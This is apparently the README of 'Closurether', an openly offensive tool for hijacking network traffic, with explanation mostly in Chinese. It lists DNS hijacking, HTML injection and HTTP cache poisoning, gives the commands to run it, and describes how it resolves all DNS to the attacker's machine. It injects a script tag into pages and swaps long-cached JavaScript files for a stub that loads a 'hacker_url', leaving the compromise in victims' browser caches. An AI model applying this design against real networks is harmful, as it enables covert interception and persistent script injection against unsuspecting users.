Closurether
=========

##### A net network traffic hijack script, including:

  - DNS hijack
  - html code inject
  - HTTP cache poisoning

##### Description:

http://www.cnblogs.com/index-html/p/wifi_hijack_2.html

http://www.cnblogs.com/index-html/p/wifi_hijack_3.html

原理说明
==========

>>> cd tool
>>> phantomjs sniffer.js
# 遍历url.txt地址，寻找 expires - now > MIN_CACHE_DAY 和 now - last-modified > MIN_STABLE_DAY 的js文件，写入 asset/list.txt (由于有的js页面并没有 LAST-MODIFIED 或 EXPIRES 就肯定不会被收录)

# 启动服务
>>> node index.js
# 启动了俩服务: dns服务(将所有dns请求都解析到本机) http服务(修改html页面和js文件)

[F] proxy_web.js
如果是html页面，则注入 <script src="http://[inject_url(见config.json文件)]"></script>
如果是js页面，分两种情况：
1.请求地址如果是inject_url, 则返回 asset/inject.js ($LIST替换为asset/list.txt), new Image().src='http://[asset/list.txt条目]' 会被浏览器立即下载并缓存
2.请求地址如果是asset/list.txt中的某条目，则返回 asset/stub.js ($URL_HACKER替换为hacker_url@config.json文件，$URL_RAW替换为请求地址)

